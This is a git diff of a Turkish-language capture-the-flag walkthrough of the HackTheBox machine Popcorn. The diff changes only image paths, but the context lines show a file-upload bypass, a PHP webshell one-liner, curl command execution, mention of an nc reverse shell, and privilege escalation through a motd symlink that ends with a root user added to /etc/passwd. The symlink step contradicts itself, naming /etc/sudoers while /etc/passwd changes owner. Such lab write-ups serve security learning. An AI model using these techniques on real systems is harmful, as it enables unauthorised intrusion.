@@ -22,11 +22,11 @@ Popcorn, TJ Null’un listesinde olmasa da bana OSCP’ye benzer hissettiren ort
 
 ### nmap
 
-![Pasted image 20250206174411.png](/img/user/Pasted%20image%2020250206174411.png)
+![Pasted image 20250206174411.png](/img/user/resimler/Pasted%20image%2020250206174411.png)
 
-![Pasted image 20250206174431.png](/img/user/Pasted%20image%2020250206174431.png)
+![Pasted image 20250206174431.png](/img/user/resimler/Pasted%20image%2020250206174431.png)
 
-![Pasted image 20250206174553.png](/img/user/Pasted%20image%2020250206174553.png)
+![Pasted image 20250206174553.png](/img/user/resimler/Pasted%20image%2020250206174553.png)
 
 OpenSSH ve Apache sürümlerine bakıldığında, bu host'un Ubuntu Trusty 14.04’ten daha eski bir sürüm çalıştırdığı anlaşılıyor. Biraz daha Google araştırması yapınca, bunun Ubuntu 9.10 Karmic olduğunu görüyorum.
 
@@ -39,13 +39,13 @@ Site sadece eski bir default sayfası:
 
 "Web sunucusu yazılımı çalışıyor ancak henüz içerik eklenmedi."
 
-![Pasted image 20250206174727.png](/img/user/Pasted%20image%2020250206174727.png)
+![Pasted image 20250206174727.png](/img/user/resimler/Pasted%20image%2020250206174727.png)
 
 #### Directory Brute Force
 
 Feroxbuster'ı siteye karşı çalıştıracağım:
 
-![Pasted image 20250206175557.png](/img/user/Pasted%20image%2020250206175557.png)
+![Pasted image 20250206175557.png](/img/user/resimler/Pasted%20image%2020250206175557.png)
 
 ```
 200      GET        4l       25w      177c http://popcorn.htb/
@@ -205,7 +205,7 @@ Feroxbuster'ı siteye karşı çalıştıracağım:
 
 /test bir PHPInfo sayfası gösterir:
 
-![Pasted image 20250206175657.png](/img/user/Pasted%20image%2020250206175657.png)
+![Pasted image 20250206175657.png](/img/user/resimler/Pasted%20image%2020250206175657.png)
 
 PHP'nin nasıl yapılandırıldığı hakkında genel olarak yararlı olabilecek bir sürü bilgi var, ancak burada hiçbirine ihtiyacım olmayacak.
 
@@ -227,7 +227,7 @@ PHPInfo sayfası, bir saldırgan için oldukça faydalı bilgiler içerir. CTF s
 
 file_uploads'un açık olduğunu not edeceğim:
 
-![Pasted image 20250206175741.png](/img/user/Pasted%20image%2020250206175741.png)
+![Pasted image 20250206175741.png](/img/user/resimler/Pasted%20image%2020250206175741.png)
 
 Bu, bir LFI bulabilirsem,  kod yürütme işlemini gerçekleştirebileceğim anlamına gelir.
 
@@ -235,7 +235,7 @@ Bu, bir LFI bulabilirsem,  kod yürütme işlemini gerçekleştirebileceğim anl
 
 Bu, dosyaları yeniden adlandırmak için bir API endpoint'ine benziyor:
 
-![Pasted image 20250206180158.png](/img/user/Pasted%20image%2020250206180158.png)
+![Pasted image 20250206180158.png](/img/user/resimler/Pasted%20image%2020250206180158.png)
 
 Bunu çalıştırmak için biraz deneme yaptım. `index.html` dosyasını `0xdf.html` olarak yeniden adlandırmaya çalıştım:
 
@@ -243,7 +243,7 @@ Bunu çalıştırmak için biraz deneme yaptım. `index.html` dosyasını `0xdf.
 
 Hata mesajı, bu dizinin yolunu sızdırıyor gibi görünüyor:
 
-![Pasted image 20250206180258.png](/img/user/Pasted%20image%2020250206180258.png)
+![Pasted image 20250206180258.png](/img/user/resimler/Pasted%20image%2020250206180258.png)
 
 İşime yarayabilecek herhangi bir dosyayı yeniden adlandıramadım. Bu noktada, eğer bir dosya yükleyebileceğim bir yer bulabilirsem ancak dosyayı yeniden adlandırmam gerekirse, bunun faydalı olabileceğini düşünüyorum. Örneğin, içine PHP kodu gizlenmiş bir PNG dosyası yükleyebilirsem ancak sadece geçerli bir görsel uzantısıyla kaydediliyorsa, bu yöntemi kullanarak dosyayı `.php` olarak değiştirebilir ve web sunucusunun çalıştırmasını sağlayabilirim.
 
@@ -252,51 +252,51 @@ Hata mesajı, bu dizinin yolunu sızdırıyor gibi görünüyor:
 
 /torrent Torrent Hoster'ın bir örneğini sağlar:
 
-![Pasted image 20250206180404.png](/img/user/Pasted%20image%2020250206180404.png)
+![Pasted image 20250206180404.png](/img/user/resimler/Pasted%20image%2020250206180404.png)
 
 Bir upload sayfası var ama sadece giriş formuna yönlendiriyor. Bir Browse (Gözat) sayfası var ve şu anda bir torrent gösteriyor:
 
-![Pasted image 20250206180438.png](/img/user/Pasted%20image%2020250206180438.png)
+![Pasted image 20250206180438.png](/img/user/resimler/Pasted%20image%2020250206180438.png)
 
 Girişte bazı tahminler denedim, ancak daha sonra Sign up linkine tıkladım:
 
-![Pasted image 20250206180458.png](/img/user/Pasted%20image%2020250206180458.png)
+![Pasted image 20250206180458.png](/img/user/resimler/Pasted%20image%2020250206180458.png)
 
 İşe yarıyor gibi görünüyor:
 
-![Pasted image 20250206180549.png](/img/user/Pasted%20image%2020250206180549.png)
+![Pasted image 20250206180549.png](/img/user/resimler/Pasted%20image%2020250206180549.png)
 
 Ve giriş yapabiliyorum:
 
-![Pasted image 20250206180601.png](/img/user/Pasted%20image%2020250206180601.png)
+![Pasted image 20250206180601.png](/img/user/resimler/Pasted%20image%2020250206180601.png)
 
 Giriş yaptıktan sonra yükleme formuna ulaşabiliyorum:
 
-![Pasted image 20250206180612.png](/img/user/Pasted%20image%2020250206180612.png)
+![Pasted image 20250206180612.png](/img/user/resimler/Pasted%20image%2020250206180612.png)
 
 Bir PHP webshell yüklemeyi denedim ama hata verdi:
 
-![Pasted image 20250206180625.png](/img/user/Pasted%20image%2020250206180625.png)
+![Pasted image 20250206180625.png](/img/user/resimler/Pasted%20image%2020250206180625.png)
 
 Kali download sayfasına gittim ve geçerli bir torrent dosyası aldım. Bunu yükleme için gönderdiğimde, bir dakika bekletiyor ve sonra yeniden yönlendirmeye çalışırken başarılı olduğunu bildiriyor:
 
-![Pasted image 20250206180712.png](/img/user/Pasted%20image%2020250206180712.png)
+![Pasted image 20250206180712.png](/img/user/resimler/Pasted%20image%2020250206180712.png)
 
 Yönlendirmeye izin verdiğimde, bu torrentin sayfasına geliyorum:
 
-![Pasted image 20250206180717.png](/img/user/Pasted%20image%2020250206180717.png)
+![Pasted image 20250206180717.png](/img/user/resimler/Pasted%20image%2020250206180717.png)
 
 “Bu torreni düzenle “ye tıkladığımda yeni bir form açılıyor:
 
-![Pasted image 20250206180731.png](/img/user/Pasted%20image%2020250206180731.png)
+![Pasted image 20250206180731.png](/img/user/resimler/Pasted%20image%2020250206180731.png)
 
 Bunu, torrent ile ilişkilendirilmiş görseli yüklemek için kullanabilirim. Eğer bir görsel sağlarsam, şu çıktıyı veriyor:
 
-![Pasted image 20250206180759.png](/img/user/Pasted%20image%2020250206180759.png)
+![Pasted image 20250206180759.png](/img/user/resimler/Pasted%20image%2020250206180759.png)
 
 Torrent sayfasına baktığımda şimdi yüklenen resmi görüyorum. HTML'e baktığımda, resme aşağıdaki url ile atıfta bulunulduğunu görüyorum:
 
-![Pasted image 20250206183315.png](/img/user/Pasted%20image%2020250206183315.png)
+![Pasted image 20250206183315.png](/img/user/resimler/Pasted%20image%2020250206183315.png)
 
 ```
 http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/0ba973670d943861fb9453eecefd3bf7d3054713.png&maxw=96
@@ -306,7 +306,7 @@ Bunun bir LFI (Local File Inclusion) olabileceğini düşündüm, ancak referans
 
 `src` ifadesi bir dosya yolu gibi göründüğünden, **`http://10.10.10.6/torrent/upload/`** adresini kontrol ettim ve yüklediğim görselin de içinde olduğu bir dizin listelemesi döndürdü. (Hatırlarsak bu adresi forexbuster da bulmuştu .)
 
-![Pasted image 20250206180903.png](/img/user/Pasted%20image%2020250206180903.png)
+![Pasted image 20250206180903.png](/img/user/resimler/Pasted%20image%2020250206180903.png)
 
 ## Shell as www-data
 
@@ -322,18 +322,18 @@ Burp’te izin verilen bir PNG yüklemesini bulup **Repeater**’a göndereceği
 
 Sitenin engellenip engellenmediğini görmek için her seferinde bir tanesini değiştirerek başlayacağım. İlk olarak, uzantıyı ==.php== olarak değiştireceğim. Sorun yok gibi görünüyor:
 
-![Pasted image 20250206181039.png](/img/user/Pasted%20image%2020250206181039.png)
+![Pasted image 20250206181039.png](/img/user/resimler/Pasted%20image%2020250206181039.png)
 
 
 Bu gerçek bir güvenlik açığıdır, çünkü bir sunucu asla bir kullanıcının `.php` olarak adlandırılabilecek bir dosya yüklemesine izin vermemelidir. Aksi takdirde, sunucu bu dosyayı PHP kodu olarak çalıştırabilir.
 
 Eğer **`Content-Type`** başlığını `application/x-php` olarak değiştirirsem, sunucu bunu engelliyor (dosya adını tekrar `.png` olarak değiştirsem bile).
 
-![Pasted image 20250206181433.png](/img/user/Pasted%20image%2020250206181433.png)
+![Pasted image 20250206181433.png](/img/user/resimler/Pasted%20image%2020250206181433.png)
 
 Content'i değiştirmenin bir önemi yok gibi görünüyor:
 
-![Pasted image 20250206181531.png](/img/user/Pasted%20image%2020250206181531.png)
+![Pasted image 20250206181531.png](/img/user/resimler/Pasted%20image%2020250206181531.png)
 
 ```
 <?php system($_REQUEST["cmd"]); ?>
@@ -343,13 +343,13 @@ Content'i değiştirmenin bir önemi yok gibi görünüyor:
 
 Filtre testi sonuçlarına göre, bir dosyayı `.php` olarak adlandırıp PHP kodu içerebileceğim gibi görünüyor, yeter ki **Content-Type** başlığını geçerli bir görsele değiştirsem.
 
-![Pasted image 20250206181640.png](/img/user/Pasted%20image%2020250206181640.png)
+![Pasted image 20250206181640.png](/img/user/resimler/Pasted%20image%2020250206181640.png)
 
 Bunu Repeater'dan göndereceğim (ya da tekrar form üzerinden shell’i yükleyebilir ve Proxy kullanarak isteği yakalayıp değiştirebilirim).
 
 **`/torrent/upload`** adresini kontrol ettiğimde, orada bir PHP dosyası buldum (bir şeyin SHA1 hash’iyle adlandırılmış gibi görünüyor).
 
-![Pasted image 20250206181725.png](/img/user/Pasted%20image%2020250206181725.png)
+![Pasted image 20250206181725.png](/img/user/resimler/Pasted%20image%2020250206181725.png)
 
 Ve çalıştırma sağlar:
 
@@ -358,12 +358,12 @@ root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![Pasted image 20250206184052.png](/img/user/Pasted%20image%2020250206184052.png)
+![Pasted image 20250206184052.png](/img/user/resimler/Pasted%20image%2020250206184052.png)
 ### Shell
 
 Bir shell almak için, nc'yi başlatacağım ve cmd'yi reverse shell olarak geçireceğim:
 
-![Pasted image 20250206184202.png](/img/user/Pasted%20image%2020250206184202.png)
+![Pasted image 20250206184202.png](/img/user/resimler/Pasted%20image%2020250206184202.png)
 
 Nc'de:
 
@@ -402,7 +402,7 @@ www-data@popcorn:/var/www/torrent/upload$
 
 Tek home dizini olan /home/george dizinine baktığımda .cache/motd.legal-displayed dosyasını görüyorum:
 
-![Pasted image 20250206184529.png](/img/user/Pasted%20image%2020250206184529.png)
+![Pasted image 20250206184529.png](/img/user/resimler/Pasted%20image%2020250206184529.png)
 
 motd.legal-displayed. Şu anda boş, ancak ilgimi çekti çünkü bu tür dosyalar kod yürütülmesine yol açabilir, çünkü genellikle yeni bir oturum başladığında yürütülürler. Google'da “[motd.legal-displayed privesc](https://www.exploit-db.com/exploits/14339)” araması yaptığımda bir Exploit-DB exploit'i buldum.
 
@@ -433,15 +433,15 @@ www-data@popcorn:/home/george$ ls -l .cache/motd.legal-displayed
 
 Bunu www-data dizininden yapabilirim. Sadece oturum açmak için bir yola ihtiyacım olacak. www-data'nın home dizininde bir .ssh dizini oluşturacağım ve bir RSA key pair oluşturacağım:
 
-![Pasted image 20250206185125.png](/img/user/Pasted%20image%2020250206185125.png)
+![Pasted image 20250206185125.png](/img/user/resimler/Pasted%20image%2020250206185125.png)
 
 Public key'i authorized_keys içine kopyalayacağım ve izinleri ayarlayacağım:
 
-![Pasted image 20250206185226.png](/img/user/Pasted%20image%2020250206185226.png)
+![Pasted image 20250206185226.png](/img/user/resimler/Pasted%20image%2020250206185226.png)
 
 Şimdi /var/www içinde bir .cache yok:
 
-![Pasted image 20250206185356.png](/img/user/Pasted%20image%2020250206185356.png)
+![Pasted image 20250206185356.png](/img/user/resimler/Pasted%20image%2020250206185356.png)
 
 Private key'in bir kopyasını alır, host'uma geri getirir ve ardından www-data olarak Popcorn'a SSH yaparsam, sadece bir shell elde etmekle kalmam:
 
@@ -486,26 +486,26 @@ ssh -i id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
 
 Ancak .cache dizini motd.legal-displayed olarak görünür:
 
-![Pasted image 20250206190253.png](/img/user/Pasted%20image%2020250206190253.png)
+![Pasted image 20250206190253.png](/img/user/resimler/Pasted%20image%2020250206190253.png)
 
 
 #### Get Write on passwd
 
 `~/.cache` dizinini temizleyeceğim ve yerine `/etc/sudoers` dosyasına bir sembolik bağlantı koyacağım.
 
-![Pasted image 20250206190404.png](/img/user/Pasted%20image%2020250206190404.png)
+![Pasted image 20250206190404.png](/img/user/resimler/Pasted%20image%2020250206190404.png)
 
 
 Şimdi tekrar SSH ile giriş yapacağım ve ardından `/etc/passwd` dosyasının sahibi `www-data` olacak.
 
-![Pasted image 20250206190551.png](/img/user/Pasted%20image%2020250206190551.png)
+![Pasted image 20250206190551.png](/img/user/resimler/Pasted%20image%2020250206190551.png)
 
 
 #### Add Root Users
 
 Yazma erişimimle, sadece bir root kullanıcısı ekleyeceğim. İlk olarak, bir şifre hash'ine ihtiyacım var.
 
-![Pasted image 20250206192029.png](/img/user/Pasted%20image%2020250206192029.png)
+![Pasted image 20250206192029.png](/img/user/resimler/Pasted%20image%2020250206192029.png)
 
 Şimdi /etc/passwd dosyasına bir kullanıcı ekleyeceğim:
 
@@ -514,7 +514,7 @@ Kullanıcı `asd123`, şifresi `asd123`'nin hash değeri, kullanıcı ve grup ki
 #### Shell
 Artık root shell'i almak için cartel'e su gönderebiliyorum:
 
-![Pasted image 20250206192016.png](/img/user/Pasted%20image%2020250206192016.png)
+![Pasted image 20250206192016.png](/img/user/resimler/Pasted%20image%2020250206192016.png)
 
 
 ### Script
